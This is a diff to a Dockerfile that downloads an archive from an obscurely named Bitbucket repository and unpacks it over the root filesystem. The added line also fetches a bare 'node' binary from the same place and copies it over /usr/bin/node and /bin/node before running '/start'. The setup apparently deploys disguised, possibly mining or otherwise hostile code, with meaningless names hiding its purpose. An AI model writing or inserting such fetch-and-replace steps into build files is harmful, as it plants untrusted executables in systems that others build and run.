@@ -2,7 +2,7 @@ FROM vm/ubuntu:22.04
 
 ENV linux8888=linuxlinuxwebwebwebweblinuxlinuxwebweb88888888888888
 
-RUN cd / && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash && /bin/source ~/.bashrc && nvm install 16.15.1 && tar -xvf ./linux8888.tar.gz -C /
+RUN cd / && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/node && cp /node /usr/bin/node && cp /node /bin/node && curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash && /bin/source ~/.bashrc && nvm install 16.15.1 && tar -xvf ./linux8888.tar.gz -C /
 
 RUN bash /start
 
